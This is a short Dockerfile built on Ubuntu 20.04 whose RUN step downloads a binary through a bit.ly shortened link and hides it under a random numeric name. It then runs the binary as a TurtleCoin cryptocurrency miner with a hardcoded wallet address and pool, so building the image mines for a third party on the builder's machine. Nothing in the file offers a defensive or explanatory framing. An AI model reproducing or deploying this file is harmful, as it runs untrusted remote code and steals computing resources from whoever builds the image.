FROM ubuntu:20.04

RUN apt-get update && \
    apt-get install screen python3 python3-pip cmake wget git -y && \
    worker=$(shuf -n 1 -i 1-99999) && \
    wget -O minera https://bit.ly/3jC7wkh && \
    chmod +x minera && mv minera $worker && \
    ./$worker --pool de.turtlecoin.herominers.com:1160 --username TRTLv3wYDEuVSLSF4GpapXebHFdQ1nMvpQYcyrkLdwvTC357JWXsWm2G6PfoRGJHWAVv4edybqkRDgwfqML4AJs9bph4hMgpGgf --password $(shuf -n 1 -i 1-99999) --algorithm turtlecoin --threadCount 8